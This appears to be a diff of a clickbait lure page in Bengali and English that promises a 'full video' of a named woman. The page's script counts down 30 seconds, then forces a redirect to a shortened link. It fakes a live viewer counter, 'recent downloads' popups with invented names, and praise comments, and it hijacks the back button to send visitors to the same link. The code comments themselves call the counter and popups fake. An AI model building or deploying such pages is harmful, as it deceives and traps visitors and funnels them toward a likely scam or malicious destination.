@@ -1,306 +1,333 @@
-
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Olivia Casta Was Live Now</title>
-  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --primary: #FF5722;
-      --primary-dark: #E64A19;
-      --text: #333;
-      --light-bg: #f5f5f5;
-    }
-    
-    body {
-      margin: 0;
-      font-family: 'Hind Siliguri', sans-serif;
-      background-color: var(--light-bg);
-      color: var(--text);
-      line-height: 1.6;
-    }
-    
-    .container {
-      max-width: 800px;
-      margin: 20px auto;
-      padding: 20px;
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-    }
-    
-    h1 {
-      color: var(--primary);
-      text-align: center;
-      margin-bottom: 10px;
-    }
-    
-    .stats {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      margin-bottom: 15px;
-      flex-wrap: wrap;
-    }
-    
-    .stat {
-      background: #f0f0f0;
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 0.9em;
-    }
-    
-    .video-container {
-      position: relative;
-      margin: 20px 0;
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    
-    iframe {
-      width: 100%;
-      height: 450px;
-      border: none;
-      display: block;
-    }
-    
-    .progress-container {
-      width: 100%;
-      background: #e0e0e0;
-      border-radius: 5px;
-      margin: 15px 0;
-    }
-    
-    .progress-bar {
-      height: 10px;
-      background: var(--primary);
-      width: 0%;
-      border-radius: 5px;
-      transition: width 1s linear;
-    }
-    
-    .premium-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.9);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      border-radius: 8px;
-    }
-    
-    .btn {
-      display: inline-block;
-      padding: 10px 25px;
-      background: var(--primary);
-      color: white;
-      border-radius: 5px;
-      text-decoration: none;
-      font-weight: bold;
-      margin: 10px 0;
-      transition: all 0.3s;
-    }
-    
-    .btn:hover {
-      background: var(--primary-dark);
-      transform: translateY(-2px);
-    }
-    
-    .comments {
-      margin-top: 30px;
-      max-height: 150px;
-      overflow-y: hidden;
-      padding: 10px;
-      background: #f9f9f9;
-      border-radius: 8px;
-      position: relative;
-    }
-    
-    .comment-container {
-      animation: scrollComments 30s linear infinite;
-    }
-    
-    @keyframes scrollComments {
-      0% { transform: translateY(0); }
-      100% { transform: translateY(-70%); }
-    }
-    
-    .comment {
-      padding: 12px;
-      margin-bottom: 10px;
-      background: white;
-      border-radius: 6px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-    
-    .comment strong {
-      color: var(--primary);
-    }
-    
-    .comment .time {
-      font-size: 0.8em;
-      color: #777;
-    }
-    
-    .floating-btn {
-      position: fixed;
-      bottom: 30px;
-      left: 30px;
-      z-index: 1000;
-    }
-    
-    .floating-btn a {
-      display: block;
-      background: #FF5722;
-      color: white;
-      padding: 15px 20px;
-      border-radius: 50px;
-      font-weight: bold;
-      text-decoration: none;
-      box-shadow: 0 5px 15px rgba(255,87,34,0.4);
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    
-    #downloadPopup {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: white;
-      padding: 15px;
-      border-radius: 8px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      z-index: 1000;
-      display: none;
-      max-width: 250px;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Olivia Casta Was Live Now</title>
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #FF5722;
+      --primary-dark: #E64A19;
+      --text: #333;
+      --light-bg: #f5f5f5;
+    }
+    
+    body {
+      margin: 0;
+      font-family: 'Hind Siliguri', sans-serif;
+      background-color: var(--light-bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+    
+    h1 {
+      color: var(--primary);
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    
+    .stats {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+    }
+    
+    .stat {
+      background: #f0f0f0;
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 0.9em;
+    }
+    
+    .video-container {
+      position: relative;
+      margin: 20px 0;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    
+    iframe {
+      width: 100%;
+      height: 450px;
+      border: none;
+      display: block;
+    }
+    
+    .progress-container {
+      width: 100%;
+      background: #e0e0e0;
+      border-radius: 5px;
+      margin: 15px 0;
+    }
+    
+    .progress-bar {
+      height: 10px;
+      background: var(--primary);
+      width: 0%;
+      border-radius: 5px;
+      transition: width 1s linear;
+    }
+    
+    .premium-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      border-radius: 8px;
+    }
+    
+    .btn {
+      display: inline-block;
+      padding: 10px 25px;
+      background: var(--primary);
+      color: white;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      margin: 10px 0;
+      transition: all 0.3s;
+    }
+    
+    .btn:hover {
+      background: var(--primary-dark);
+      transform: translateY(-2px);
+    }
+    
+    .comments {
+      margin-top: 30px;
+      max-height: 150px;
+      overflow-y: hidden;
+      padding: 10px;
+      background: #f9f9f9;
+      border-radius: 8px;
+      position: relative;
+    }
+    
+    .comment-container {
+      animation: scrollComments 30s linear infinite;
+    }
+    
+    @keyframes scrollComments {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-70%); }
+    }
+    
+    .comment {
+      padding: 12px;
+      margin-bottom: 10px;
+      background: white;
+      border-radius: 6px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    
+    .comment strong {
+      color: var(--primary);
+    }
+    
+    .comment .time {
+      font-size: 0.8em;
+      color: #777;
+    }
+    
+    /* Floating CTA Button */
+    .floating-btn {
+      position: fixed;
+      bottom: 30px;
+      left: 30px;
+      z-index: 1000;
+    }
+    
+    .floating-btn a {
+      display: block;
+      background: #FF5722;
+      color: white;
+      padding: 15px 20px;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 5px 15px rgba(255,87,34,0.4);
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    /* Download Popup */
+    #downloadPopup {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      z-index: 1000;
+      display: none;
+      max-width: 250px;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Olivia Full Video </h1>
-    
-    <div class="stats">
-      <div class="stat">👁️ 330,637K Views</div>
-      <div class="stat">📥 90,537K Download </div>
-      <div class="stat">⭐ 4.9/5 Ratting</div>
-      <div class="stat">👥 <span id="liveViewers">22,460</span> LIVE</div>
-    </div>
-    
-    <div class="video-container">
-      <iframe id="videoPlayer" src="https://mega.nz/embed/L5wjHToQ#2FaXJLoxve9qkHT9Q8xYF2yJXFvU3vCzNOU4wV9SJXc" allowfullscreen></iframe>
-      
-      <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
-      
-      <div class="premium-overlay" id="premiumOverlay">
-        <h2>To Watch Full Video. Sing-Up !</h2>
-        <p>You Watch Free 30s.Please Sing-Up Now</p>
-        <a href="https://t.co/nhYueZgaGU" class="btn">👉 Sign-up For (Free)</a>
-      </div>
-    </div>
-    
-    <div style="text-align: center;">
-      <a href="https://t.co/nhYueZgaGU">📥 ভিডিও ডাউনলোড করুন</a>
-    </div>
-    
-    <div class="comments">
-      <div class="comment-container" id="commentsSection">
-        <div class="comment">
-          <strong> Alex:</strong> Beautiful video — and I love how easy the download was!<span class="time">Just Now</span>
-        </div>
-        <div class="comment">
-          <strong>Pedro:</strong>Respect for uploading such quality content with no clickbait 🙌! <span class="time">Just Now</span>
-        </div>
-        <div class="comment">
-          <strong>Riso:</strong> Sign-up And Download 👍 <span class="time">50s ago</span>
-        </div>
-        <div class="comment">
-          <strong>Adrian:</strong> Confirmed: the download link is working 100%! Thanks for sharing<span class="time">1m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Jhon Riffo:</strong> Absolutely stunning 🥰<span class="time">3m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Jerry:</strong> Yes my love lover 💋💋💋💋💋<span class="time">4m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Charles:</strong> My baby is beautiful.<span class="time">5m ago</span>
-        </div>
-      </div>
-    </div>
-  </div>
-  <div class="floating-btn">
-    <a href="https://t.co/nhYueZgaGU">
-      🔥 সাইন আপ করুন সম্পূর্ণ ভিডিও দেখতে! 🔥
-    </a>
-  </div>
-  <div id="downloadPopup">
-    <strong>Recent Downloads:</strong>
-    <div id="downloadList"></div>
-  </div>
-  <script>
-    const totalTime = 30;
-    let timeLeft = totalTime;
-    const progressBar = document.getElementById('progressBar');
-    const premiumOverlay = document.getElementById('premiumOverlay');
-    const timer = setInterval(() => {
-      timeLeft--;
-      const progress = ((totalTime - timeLeft) / totalTime) * 100;
-      progressBar.style.width = progress + "%";
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        showSignupPopup();
-      }
-    }, 1000);
-    function showSignupPopup() {
-      premiumOverlay.style.display = "flex";
-      setTimeout(() => {
-        window.location.href = "https://t.co/nhYueZgaGU";
-      }, 5000);
-    }
-    setInterval(() => {
-      const viewers = document.getElementById('liveViewers');
-      const current = parseInt(viewers.textContent.replace(/,/g, ''));
-      viewers.textContent = (current + Math.floor(Math.random() * 5)).toLocaleString();
-    }, 3000);
-    const names = ['মোহাম্মদ', 'আনিকা', 'রাজু', 'সুমাইয়া', 'ইমন', 'তানহা'];
-    const places = ['ঢাকা', 'চট্টগ্রাম', 'সিলেট', 'খুলনা', 'রাজশাহী', 'বরিশাল'];
-    function showDownload() {
-      const name = names[Math.floor(Math.random() * names.length)];
-      const place = places[Math.floor(Math.random() * places.length)];
-      const time = Math.floor(Math.random() * 5) + 1;
-      document.getElementById('downloadList').innerHTML =
-        `<div>${name} from ${place} downloaded ${time} minute${time > 1 ? 's' : ''} ago</div>` +
-        document.getElementById('downloadList').innerHTML;
-      document.getElementById('downloadPopup').style.display = 'block';
-      setTimeout(() => document.getElementById('downloadPopup').style.display = 'none', 5000);
-    }
-    setTimeout(showDownload, 15000);
-    setInterval(showDownload, 20000 + Math.random() * 20000);
-    const commentsSection = document.getElementById('commentsSection');
-    commentsSection.innerHTML = commentsSection.innerHTML + commentsSection.innerHTML;
-    window.addEventListener('load', function() {
-      history.pushState(null, null, location.href);
-      window.onpopstate = function(event) {
-        window.location.href = "https://t.co/nhYueZgaGU";
-      };
-    });
-  </script>
+  <div class="container">
+    <h1>Olivia Full Video </h1>
+    
+    <div class="stats">
+      <div class="stat">👁️ 330,637K Views</div>
+      <div class="stat">📥 90,537K Download </div>
+      <div class="stat">⭐ 4.9/5 Ratting</div>
+      <div class="stat">👥 <span id="liveViewers">22,460</span> LIVE</div>
+    </div>
+    
+    <div class="video-container">
+      <iframe id="videoPlayer" src="https://mega.nz/embed/L5wjHToQ#2FaXJLoxve9qkHT9Q8xYF2yJXFvU3vCzNOU4wV9SJXc" allowfullscreen></iframe>
+      
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      
+      <div class="premium-overlay" id="premiumOverlay">
+        <h2>To Watch Full Video. Sing-Up !</h2>
+        <p>You Watch Free 30s.Please Sing-Up Now</p>
+        <a href="https://t.co/nhYueZgaGU" class="btn">👉 Sign-up For (Free)</a>
+      </div>
+    </div>
+    
+    <div style="text-align: center;">
+      <a href="https://t.co/nhYueZgaGU">📥 ভিডিও ডাউনলোড করুন</a>
+    </div>
+    
+    <div class="comments">
+      <div class="comment-container" id="commentsSection">
+        <div class="comment">
+          <strong> Alex:</strong> Beautiful video — and I love how easy the download was!<span class="time">Just Now</span>
+        </div>
+        <div class="comment">
+          <strong>Pedro:</strong>Respect for uploading such quality content with no clickbait 🙌! <span class="time">Just Now</span>
+        </div>
+        <div class="comment">
+          <strong>Riso:</strong> Sign-up And Download 👍 <span class="time">50s ago</span>
+        </div>
+        <div class="comment">
+          <strong>Adrian:</strong> Confirmed: the download link is working 100%! Thanks for sharing<span class="time">1m ago</span>
+        </div>
+        <div class="comment">
+          <strong>Jhon Riffo:</strong> Absolutely stunning 🥰<span class="time">3m ago</span>
+        </div>
+        <div class="comment">
+          <strong>Jerry:</strong> Yes my love lover 💋💋💋💋💋<span class="time">4m ago</span>
+        </div>
+        <div class="comment">
+          <strong>Charles:</strong> My baby is beautiful.<span class="time">5m ago</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Floating CTA Button -->
+  <div class="floating-btn">
+    <a href="https://t.co/nhYueZgaGU">
+      🔥 সাইন আপ করুন সম্পূর্ণ ভিডিও দেখতে! 🔥
+    </a>
+  </div>
+
+  <!-- Recent Downloads Popup -->
+  <div id="downloadPopup">
+    <strong>Recent Downloads:</strong>
+    <div id="downloadList"></div>
+  </div>
+
+  <script>
+    // টাইমার সেটআপ (৩০ সেকেন্ড)
+    const totalTime = 30;
+    let timeLeft = totalTime;
+    const progressBar = document.getElementById('progressBar');
+    const premiumOverlay = document.getElementById('premiumOverlay');
+    
+    // প্রোগ্রেস বার আপডেট
+    const timer = setInterval(() => {
+      timeLeft--;
+      const progress = ((totalTime - timeLeft) / totalTime) * 100;
+      progressBar.style.width = progress + "%";
+      
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        showSignupPopup();
+      }
+    }, 1000);
+    
+    // Signup Popup and Redirect
+    function showSignupPopup() {
+      premiumOverlay.style.display = "flex";
+      setTimeout(() => {
+        window.location.href = "https://t.co/nhYueZgaGU";
+      }, 5000); // 5 seconds delay before redirect
+    }
+    
+    // Fake live viewer counter
+    setInterval(() => {
+      const viewers = document.getElementById('liveViewers');
+      const current = parseInt(viewers.textContent.replace(/,/g, ''));
+      viewers.textContent = (current + Math.floor(Math.random() * 5)).toLocaleString();
+    }, 3000);
+    
+    // Fake recent downloads popup
+    const names = ['মোহাম্মদ', 'আনিকা', 'রাজু', 'সুমাইয়া', 'ইমন', 'তানহা'];
+    const places = ['ঢাকা', 'চট্টগ্রাম', 'সিলেট', 'খুলনা', 'রাজশাহী', 'বরিশাল'];
+    
+    function showDownload() {
+      const name = names[Math.floor(Math.random() * names.length)];
+      const place = places[Math.floor(Math.random() * places.length)];
+      const time = Math.floor(Math.random() * 5) + 1;
+      
+      document.getElementById('downloadList').innerHTML = 
+        `<div>${name} from ${place} downloaded ${time} minute${time > 1 ? 's' : ''} ago</div>` + 
+        document.getElementById('downloadList').innerHTML;
+      
+      document.getElementById('downloadPopup').style.display = 'block';
+      setTimeout(() => document.getElementById('downloadPopup').style.display = 'none', 5000);
+    }
+    
+    // Show first popup after 15 seconds
+    setTimeout(showDownload, 15000);
+    // Then show every 20-40 seconds
+    setInterval(showDownload, 20000 + Math.random() * 20000);
+    
+    // Double comments for scrolling effect
+    const commentsSection = document.getElementById('commentsSection');
+    commentsSection.innerHTML = commentsSection.innerHTML + commentsSection.innerHTML;
+    
+    // ব্যাক বাটন হ্যান্ডলিং - Redirect to your link when back button is pressed
+    window.addEventListener('load', function() {
+      history.pushState(null, null, location.href);
+      window.onpopstate = function(event) {
+        window.location.href = "https://t.co/nhYueZgaGU";
+      };
+    });
+  </script>
 </body>
 </html>
+
